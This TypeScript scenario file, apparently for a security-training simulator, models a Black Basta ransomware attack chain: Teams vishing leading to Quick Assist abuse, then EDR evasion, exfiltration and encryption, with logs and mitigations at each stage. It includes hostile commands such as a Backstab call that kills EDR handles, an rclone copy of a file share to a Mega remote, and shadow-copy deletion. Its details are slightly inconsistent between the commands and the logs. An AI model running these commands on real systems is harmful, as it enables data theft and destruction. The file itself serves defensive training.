import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'blackbasta-qakbot-backstab-ransomware',
    title: 'Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Black Basta affiliates (Storm-1811) flood victim mailboxes with spam before calling over Microsoft Teams impersonating IT Help Desk to coerce Windows Quick Assist execution, deploy Backstab (PROCEXP.SYS BYOVD) to blind EDR, and detonate ChaCha20/RSA-4096 encryption (.basta).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Storm-1811 / Black Basta Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Microsoft Teams External Federation', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Workstation (QuickAssist.exe Session)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-131A / Defender XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Shares (.basta ChaCha20)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        narration:
          'Storm-1811 floods an employee’s corporate email inbox with thousands of newsletter signups, then calls the user via external Microsoft Teams federated chat impersonating "IT Security Help Desk" and convinces them to press Ctrl+Win+Q to launch Microsoft’s built-in QuickAssist.exe remote support tool.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1566.004 - Spearphishing Voice / T1219 - Remote Access Software)',
        technicalCommands: [
          'C:\\Windows\\System32\\QuickAssist.exe (User enters 6-digit operator security code over Microsoft Teams call)',
          'QuickAssist WebView2 session connects to *.remoteassistance.support.services.microsoft.com',
        ],
        defenseMitigation:
          'Restrict Microsoft Teams external federation to an explicit domain allowlist and block or remove `QuickAssist.exe` via AppLocker/Intune policies.',
        logs: [
          {
            id: 'basta-1',
            timestamp: '10:04:18.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'QuickAssist.exe',
            CommandLine: 'C:\\Windows\\System32\\QuickAssist.exe',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\QuickAssist.exe | PrecedingSignal: Inbound External Teams Call from "HelpDesk_Admin@onmicrosoft.com" + 1,800 SMTP Spam Messages | ChildProcess: powershell.exe / curl.exe',
            parsedFields: {
              SocialEngineeringVector: 'Email Bombing + External Microsoft Teams Vishing (Storm-1811)',
              RemoteSupportLolbin: 'C:\\Windows\\System32\\QuickAssist.exe',
              AdvisoryId: 'CISA AA24-131A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        narration:
          'Through the interactive Quick Assist session, the operator downloads payloads via cURL/MSI, uses Backstab (loading PROCEXP.SYS to close EDR file/process handles), scans the AD network with SoftPerfect netscan.exe, and exfiltrates files with rclone.exe.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Discovery (T1562.001 / T1046)',
        technicalCommands: [
          'backstab.exe -p MsMpEng.exe -k -d C:\\Users\\Public\\PROCEXP.SYS (Closes all kernel handles held by EDR)',
          'netscan.exe /hide && rclone.exe copy "\\\\fileserver\\corp" mega:basta_dump --transfers 16',
        ],
        defenseMitigation:
          'Monitor child processes spawned during active `QuickAssist.exe` sessions (`cmd.exe`, `powershell.exe`, `msiexec.exe`, `curl.exe`) and block `PROCEXP.SYS` via WDAC.',
        logs: [
          {
            id: 'basta-2',
            timestamp: '10:12:44.605',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'backstab.exe',
            CommandLine: 'C:\\Users\\Public\\backstab.exe -n MsMpEng.exe -k',
            raw: 'EDR Defense Evasion Alert | Tool: Backstab (BYOVD Handle Killer) | LoadedDriver: PROCEXP.SYS | ReconTool: SoftPerfect Network Scanner (netscan.exe) | ExfilTool: rclone.exe',
            parsedFields: {
              EdrEvasionTool: 'Backstab (PROCEXP.SYS IOCTL Handle Stripping)',
              NetworkScanner: 'SoftPerfect netscan.exe',
              ExfiltrationTool: 'rclone.exe',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        narration:
          'Using PsExec or PowerShell Invoke-Command across the domain, the operator deletes Volume Shadow Copies with vssadmin.exe, disables DNS/DHCP services if running in safe-mode, and encrypts files in 64-byte intermittent chunks using ChaCha20 and RSA-4096, appending the .basta extension.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1490)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet',
          'basta.exe -forcepath "\\\\corp-nas\\shares" (XChaCha20 + RSA-4096 encryption -> readme.faa.txt & .basta)',
        ],
        defenseMitigation:
          'Enforce SMB signing, block PsExec (`PSEXESVC.exe`) lateral service creation, and maintain immutable air-gapped backups.',
        logs: [
          {
            id: 'basta-3',
            timestamp: '10:45:02.119',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'basta.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\basta.exe | TargetFilename: \\\\corp-nas\\shares\\readme.faa.txt | Cipher: XChaCha20 + RSA-4096 | AppendedExtension: .basta',
            parsedFields: {
              RansomwareFamily: 'Black Basta',
              EncryptionAlgorithm: 'ChaCha20 (Intermittent 64-byte blocks) + RSA-4096',
              RansomNote: 'readme.faa.txt',
              FileExtension: '.basta',
            },
          },
        ],
        packets: [],
      },
    ],
  };
